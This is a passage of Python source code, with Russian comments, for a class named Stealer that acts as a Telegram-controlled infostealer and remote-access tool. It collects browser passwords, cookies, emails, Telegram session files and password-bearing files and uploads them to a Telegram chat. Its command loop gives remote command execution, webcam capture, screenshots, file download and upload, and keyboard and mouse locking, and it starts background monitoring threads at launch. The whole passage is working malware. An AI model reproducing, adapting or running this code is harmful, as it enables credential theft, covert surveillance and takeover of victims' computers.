                    logging.info(f"Список файлов отправлен как файл: {temp_file}")
                    return f"Список файлов для {path} отправлен как файл: {result}"

        except Exception as e:
            logging.error(f"Ошибка при выводе списка файлов для {path}: {str(e)}")
            return f"Ошибка при выводе списка файлов: {str(e)}"




    def send_to_telegram(self):
        """Send collected data to Telegram."""
        try:
            passwords = self.get_browser_passwords()
            cookies = self.get_browser_cookies()
            emails = self.get_browser_emails()
            files_data = self.search_files_for_passwords()
            telegram_data = self.get_telegram_data()
            session_files = self.get_telegram_session()
            data = []
            data.append(f'System Info ({self.device_id}):')
            for k, v in self.get_system_info().items():
                data.append(f'{k}: {v}')
            data.append('\nPasswords:')
            data.extend(passwords if passwords else ['No passwords found.'])
            data.append('\nCookies:')
            data.extend(cookies if cookies else ['No cookies found.'])
            data.append('\nEmails:')
            data.extend(emails if emails else ['No emails found.'])
            data.append('\nFile Data:')
            data.extend(files_data if files_data else ['No file data found.'])
            data.append('\nTelegram Data:')
            data.extend(telegram_data if telegram_data else ['No Telegram data found.'])
            data.append('\nTelegram Session Files:')
            data.extend(session_files if session_files else ['No session files found.'])
            message = '\n'.join(data)
            if len(message) > 4000:
                temp_file = os.path.join(self.temp_dir, f'data_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(message)
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Data too large, sent as file: {temp_file}")
                return f"Data sent as file from {self.device_id}: {result}"
            self.send_telegram_message(message)
            file_path = self.create_pptx(passwords, cookies, emails, files_data, telegram_data, session_files)
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                file_payload = {'chat_id': self.chat_id}
                response = requests.post(self.telegram_file_api, data=file_payload, files=files, timeout=5)
                response.raise_for_status()
                logging.info(f"Sent file to Telegram: {file_path}")
            for session_file in session_files:
                with open(session_file, 'rb') as f:
                    files = {'document': (os.path.basename(session_file), f)}
                    file_payload = {'chat_id': self.chat_id}
                    response = requests.post(self.telegram_file_api, data=file_payload, files=files, timeout=5)
                    response.raise_for_status()
                    logging.info(f"Sent session file to Telegram: {session_file}")
            return f"Data sent to Telegram from {self.device_id}."
        except Exception as e:
            logging.error(f"Error sending to Telegram: {str(e)}")
            return f"Error sending data to Telegram from {self.device_id}: {str(e)}"

    def send_telegram_message(self, message):
        """Send a message to Telegram."""
        try:
            if len(message) > 4000:
                temp_file = os.path.join(self.temp_dir, f'message_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(message)
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Message too large, sent as file: {temp_file}")
                return f"Message sent as file from {self.device_id}: {result}"
            payload = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'MarkdownV2'}
            response = requests.post(self.telegram_text_api, data=payload, timeout=5)
            response.raise_for_status()
            logging.info(f"Sent Telegram message from {self.device_id}: {message[:100]}...")
            return f"Message sent from {self.device_id}."
        except requests.exceptions.HTTPError as e:
            logging.error(f"HTTP error sending Telegram message: {str(e)}")
            # Пробуем без Markdown
            payload = {'chat_id': self.chat_id, 'text': message.replace('```', '')}
            try:
                response = requests.post(self.telegram_text_api, data=payload, timeout=5)
                response.raise_for_status()
                logging.info(f"Sent Telegram message without Markdown: {message[:100]}...")
                return f"Message sent from {self.device_id}."
            except requests.exceptions.HTTPError as e2:
                logging.error(f"Failed to send Telegram message without Markdown: {str(e2)}")
                # Отправляем как файл
                temp_file = os.path.join(self.temp_dir, f'message_{int(time.time())}.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(message)
                result = self.download_file(temp_file)
                os.remove(temp_file)
                logging.info(f"Message sent as file due to HTTP error: {temp_file}")
                return f"Message sent as file from {self.device_id}: {result}"
        except Exception as e:
            logging.error(f"Error sending Telegram message from {self.device_id}: {str(e)}")
            return f"Error sending Telegram message from {self.device_id}: {str(e)}"

    def handle_telegram_commands(self):
        """Обрабатывает все входящие команды Telegram."""
        offset = 0
        while self.running:
            try:
                with update_lock:
                    updates = requests.get(
                        f'https://api.telegram.org/bot{self.bot_token}/getUpdates',
                        params={'offset': offset, 'timeout': 30},
                        timeout=35
                    ).json()

                if not updates.get('ok'):
                    time.sleep(5)
                    continue

                for update in updates.get('result', []):
                    offset = update['update_id'] + 1

                    # === ТЕКСТОВЫЕ КОМАНДЫ ===
                    if 'message' in update and 'text' in update['message']:
                        chat_id = update['message']['chat']['id']
                        if str(chat_id) != self.chat_id:
                            continue

                        selected_device = self.get_selected_device(chat_id)
                        if selected_device and selected_device.lower() != self.device_id.lower():
                            continue

                        command = update['message']['text'].strip()

                        if command == '/listdevices':
                            self.send_telegram_message(self.list_devices())

                        elif command.startswith('/selectdevice '):
                            device_id = command.split(' ', 1)[1]
                            self.send_telegram_message(self.set_selected_device(chat_id, device_id))

                        elif command == '/debugdevices':
                            self.send_telegram_message(self.debug_devices())

                        elif command == '/disableautostart':
                            self.send_telegram_message(self.disable_autostart())

                        elif command == '/screenshot':
                            self.send_telegram_message(self.take_screenshot())

                        elif command == '/webcam':
                            self.send_telegram_message(self.capture_webcam())

                        elif command == '/listprocesses':
                            self.send_process_buttons(page=0)

                        elif command == '/exitgame':
                            self.send_process_buttons(page=0)

                        elif command == '/lockkeyboard':
                            self.send_telegram_message(self.lock_keyboard())

                        elif command == '/unlockkeyboard':
                            self.send_telegram_message(self.unlock_keyboard())

                        elif command == '/lockmouse':
                            self.send_telegram_message(self.lock_mouse())

                        elif command == '/unlockmouse':
                            self.send_telegram_message(self.unlock_mouse())

                        elif command == '/sound':
                            self.send_telegram_message(self.play_loud_sound())

                        elif command.startswith('/setvolume '):
                            volume = command.split(' ', 1)[1]
                            self.send_telegram_message(self.set_volume(volume))

                        elif command == '/offvolume':
                            self.send_telegram_message(self.mute_volume())

                        elif command == '/onwifi':
                            self.send_telegram_message(self.enable_wifi())

                        elif command == '/offwifi':
                            self.send_telegram_message(self.disable_wifi())

                        elif command.startswith('/turnhotkey '):
                            hotkey = command.split(' ', 1)[1]
                            self.send_telegram_message(self.trigger_hotkey(hotkey))

                        elif command == '/imagepc':
                            self.waiting_for_photo = True
                            self.send_telegram_message(f"Отправь фото для обоев на {self.device_id}.")

                        elif command == '/imagereturn':
                            self.send_telegram_message(self.restore_wallpaper())

                        elif command == '/showimage':
                            self.waiting_for_showimage = True
                            self.send_telegram_message(f"Отправь фото для показа на {self.device_id}.")

                        elif command == '/restart':
                            self.send_telegram_message(self.restart_system())

                        elif command == '/shutdown':
                            self.send_telegram_message(self.shutdown_system())

                        elif command == '/lockscreen':
                            self.send_telegram_message(self.lock_screen())

                        elif command.startswith('/openurl '):
                            url = command.split(' ', 1)[1]
                            self.send_telegram_message(self.open_url(url))

                        elif command.startswith('/sendkeys '):
                            text = command.split(' ', 1)[1]
                            self.send_telegram_message(self.send_keys(text))

                        elif command == '/getclipboard':
                            self.send_telegram_message(self.get_clipboard())

                        elif command.startswith('/setclipboard '):
                            text = command.split(' ', 1)[1]
                            self.send_telegram_message(self.set_clipboard(text))

                        elif command.startswith('/listfiles '):
                            path = command.split(' ', 1)[1]
                            self.send_telegram_message(self.list_files(path, page=0))

                        elif command.startswith('/downloadfile '):
                            file_path = command.split(' ', 1)[1]
                            self.send_telegram_message(self.download_file(file_path))

                        elif command.startswith('/executecmd '):
                            cmd = command.split(' ', 1)[1]
                            self.send_telegram_message(self.execute_cmd(cmd))

                        elif command == '/monitor':
                            threading.Thread(target=self.monitor_processes, daemon=True).start()
                            threading.Thread(target=self.monitor_search, daemon=True).start()
                            self.send_telegram_message(f"Мониторинг запущен на {self.device_id}.")

                        elif command.startswith('/mousecircle '):
                            parts = command.split()
                            duration = float(parts[1]) if len(parts) > 1 else 10
                            speed = float(parts[2]) if len(parts) > 2 else 10
                            self.send_telegram_message(self.mouse_circle(duration, speed))

                        elif command == '/rickroll':
                            self.send_telegram_message(self.rickroll())

                        elif command.startswith('/cursorhide '):
                            duration = float(command.split()[1]) if len(command.split()) > 1 else 30
                            self.send_telegram_message(self.cursorhide(duration))

                        elif command == '/reversescreen':
                            self.send_telegram_message(self.reversescreen())

                        elif command.startswith('/cmdflood '):
                            count = int(command.split()[1]) if len(command.split()) > 1 else 20
                            self.send_telegram_message(self.cmdflood(count))

                        elif command == '/upload':
                            self.waiting_for_upload = True
                            self.send_telegram_message(f"Отправь файл для загрузки на {self.device_id}.")

                        elif command == '/passwordsteal':
                            self.send_telegram_message(self.passwordsteal())

                        elif command == '/cookiesteal':
                            self.send_telegram_message(self.cookiesteal())

                        elif command == '/browserhistory':
                            self.send_telegram_message(self.browserhistory())

                        elif command == '/steal':
                            threading.Thread(target=self.steal_tdata, daemon=True).start()

                        elif command == '/stop':
                            self.running = False
                            self.send_telegram_message(f"Бот остановлен на {self.device_id}.")
                            self.release_lock()
                            sys.exit(0)

                    # === CALLBACK КНОПКИ ===
                    elif 'callback_query' in update:
                        callback_data = update['callback_query']['data']
                        chat_id = update['callback_query']['message']['chat']['id']
                        if str(chat_id) != self.chat_id:
                            continue

                        if callback_data.startswith('download_all_'):
                            import base64
                            try:
                                encoded_path = callback_data.replace('download_all_', '')
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
                                self.send_telegram_message(f"Скачиваю все файлы из {path}...")
                                for file in self.all_files:
                                    if os.path.isfile(file["path"]) and os.path.getsize(file["path"]) <= 50 * 1024 * 1024:
                                        self.send_telegram_message(self.download_file(file["path"]))
                                self.send_telegram_message("Все файлы отправлены.")
                            except Exception as e:
                                self.send_telegram_message(f"Ошибка: {e}")

                        elif callback_data.startswith('download_'):
                            try:
                                parts = callback_data.replace('download_', '').split('_')
                                page = int(parts[0])
                                index = int(parts[1])
                                if page in self.current_files and index < len(self.current_files[page]):
                                    file_path = self.current_files[page][index]["path"]
                                    self.send_telegram_message(self.download_file(file_path))
                            except Exception as e:
                                self.send_telegram_message(f"Ошибка скачивания: {e}")

                        elif callback_data.startswith('filepage_'):
                            try:
                                import base64
                                parts = callback_data.split('_', 2)
                                page = int(parts[1])
                                encoded_path = parts[2]
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
                                self.send_telegram_message(self.list_files(path, page=page))
                            except Exception as e:
                                self.send_telegram_message(f"Ошибка перехода: {e}")

                        elif callback_data.startswith('refresh_'):
                            try:
                                import base64
                                encoded_path = callback_data.replace('refresh_', '')
                                path = base64.urlsafe_b64decode(encoded_path).decode('utf-8')
                                self.send_telegram_message(self.list_files(path, page=0))
                            except Exception as e:
                                self.send_telegram_message(f"Ошибка обновления: {e}")

                        elif callback_data.startswith('page_'):
                            page = int(callback_data.replace('page_', ''))
                            self.send_process_buttons(page=page)

                        elif callback_data.startswith('exitgame_'):
                            proc_name = callback_data.replace('exitgame_', '')
                            self.send_telegram_message(self.exit_game(proc_name))

                    # === ФОТО / ФАЙЛЫ ===
                    elif 'message' in update:
                        msg = update['message']

                        if 'photo' in msg and self.waiting_for_photo:
                            file_id = msg['photo'][-1]['file_id']
                            if self.download_photo(file_id):
                                self.send_telegram_message(self.set_wallpaper(self.wallpaper_file))
                            self.waiting_for_photo = False

                        elif 'photo' in msg and self.waiting_for_showimage:
                            file_id = msg['photo'][-1]['file_id']
                            self.send_telegram_message(self.show_image(file_id))
                            self.waiting_for_showimage = False

                        elif 'document' in msg and getattr(self, 'waiting_for_upload', False):
                            file_id = msg['document']['file_id']
                            self.send_telegram_message(self.upload_file(file_id))
                            self.waiting_for_upload = False

                time.sleep(1)
            except Exception as e:
                logging.error(f"Ошибка обработки команд: {e}")
                time.sleep(5)


# === ЗАПУСК ===
if __name__ == '__main__':
    try:
        stealer = Stealer()
        
        # === АВТОМАТИЧЕСКИЕ ФОНОВЫЕ ЗАДАЧИ ===
        threading.Thread(target=stealer.heartbeat, daemon=True).start()
        threading.Thread(target=stealer.monitor_processes, daemon=True).start()
        threading.Thread(target=stealer.monitor_search, daemon=True).start()

        # === ОСНОВНОЙ ЦИКЛ ===
        stealer.handle_telegram_commands()

    except Exception as e:
        logging.critical(f"Критическая ошибка: {e}")
        sys.exit(1)